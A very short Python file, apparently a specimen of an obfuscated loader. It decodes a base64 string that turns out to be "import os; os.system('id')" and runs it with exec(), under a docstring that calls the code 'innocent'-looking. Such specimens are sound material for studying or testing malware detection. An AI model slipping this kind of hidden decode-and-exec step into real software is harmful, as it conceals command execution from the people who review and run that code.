"""Main loader — looks innocent."""
from config import get_endpoint, get_payload_decoder

def run():
    decoder = get_payload_decoder()
    data = decoder("aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ2lkJyk=")
    exec(data)
